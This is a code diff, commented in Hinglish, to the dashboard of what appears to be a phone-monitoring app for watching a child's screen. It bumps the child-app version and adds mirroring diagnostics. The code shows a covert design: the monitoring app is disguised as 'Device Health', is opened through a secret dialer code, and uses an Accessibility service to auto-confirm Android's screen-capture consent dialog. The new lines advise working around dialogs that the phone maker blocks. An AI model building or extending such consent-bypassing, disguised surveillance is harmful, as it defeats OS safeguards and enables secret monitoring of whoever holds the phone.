@@ -4,8 +4,8 @@
 // Child app ka LATEST versionCode — har naye release ke saath yahan bump karo.
 // Saare PURANA-app checks isi se chalte hain (banner, phone check, watchdog).
 // v1.8/vc9: UpdateReceiver PENDING_USER_ACTION fix + fallback + honest statuses.
-const LATEST_VC = 9;
-const LATEST_V = "1.8";
+const LATEST_VC = 10;
+const LATEST_V = "1.9";
 
 const S = {
   token: localStorage.getItem("fg_token") || "",
@@ -1398,7 +1398,8 @@ function renderMirrorDiag(d) {
     vc === null ? "pata nahi (purana build)" : "v" + (h.versionName || "") + " (build " + vc + ")" + (vc >= LATEST_VC ? " — latest ✓" : " — PURANA"),
     vc !== null && vc < LATEST_VC ? "Set tab → “📲 Child app abhi update karo”" : ""));
   rows.push("<li>🤖 <b>Android:</b> " + androidName + (d.device ? " · " + esc(d.device) : "") + "</li>");
-  if (d.consentPending) rows.push("<li>⏳ <b>Consent dialog:</b> request ho chuki hai, abhi grant nahi hui — 5–10 sec ruko</li>");
+  if (d.consentPending) rows.push("<li>⏳ <b>Consent dialog:</b> request ho chuki hai, abhi grant nahi hui — 5–10 sec ruko" + (d.consentUiSeen === false ? " · <b>⚠️ dialog bachche ke phone par KHULA HI NAHI</b> (OEM ne block kiya)" : "") + "</li>");
+  if (d.capturePending) rows.push("<li>📸 <b>Screenshot:</b> consent ka intezaar — naya build consent milte hi khud capture karke bhej dega, dobara tap ki zaroorat nahi</li>");
   rows.push(diagRow(d.screenOn === true, "Bachche ki screen", d.screenOn ? "ON ✓" : "OFF — frames isliye nahi aa rahe", d.screenOn ? "" : "Phone screen ON karo, frames khud aane lagenge"));
   rows.push(diagRow(h.mirrorReady === true, "Screen capture consent", h.mirrorReady ? "granted ✓" : "abhi nahi", h.mirrorReady ? "" : "Mirror shuru dabao — dialog khud khulega aur confirm hoga"));
   rows.push(diagRow(h.accessibility !== false, "Accessibility", h.accessibility === false ? "OFF" : "ON ✓", h.accessibility === false ? "Settings → Accessibility → Device Health → ON (consent auto-confirm isi se hota hai)" : ""));
@@ -1419,6 +1420,7 @@ function renderMirrorDiag(d) {
   else if (d.screenOn === false) verdict = "👉 <b>Screen OFF hai. Bachche ka phone ON karo — frames 1–2 sec me khud aayenge.</b>";
   else if (h.accessibility === false) verdict = "👉 <b>Accessibility OFF hai — consent dialog khud confirm nahi ho payega. Wo ON karo, phir Mirror band karke dobara shuru karo.</b>";
   else if (h.overlay === false) verdict = "👉 <b>Display over apps OFF hai — background me consent khulti hi nahi. Allow karo, phir dobara try karo.</b>";
+  else if (d.consentPending && d.consentUiSeen === false) verdict = "👉 <b>Consent dialog bachche ke phone par khula HI nahi (OEM ne block kiya). Bachche ke phone par Device Health app ek baar kholo (dial *#*#2724#*#*), phir Live tab se Mirror dobara shuru karo.</b>";
   else if (d.consentPending) verdict = "👉 <b>Consent abhi confirm ho raha hai — 10 sec ruko. Phir bhi screen na aaye to Mirror band karke dobara shuru karo.</b>";
   else if ((d.frames || 0) === 0 && h.mirrorReady !== true) verdict = "👉 <b>Capture session start nahi hua — Mirror band karo, 5 sec ruko, phir dobara “▶ Mirror shuru karo” dabao.</b>";
   else verdict = "👉 <b>Phone side theek lag raha hai — 5–10 sec me frames aane chahiye. Nahi aaye to Mirror band → dobara shuru karo.</b>";
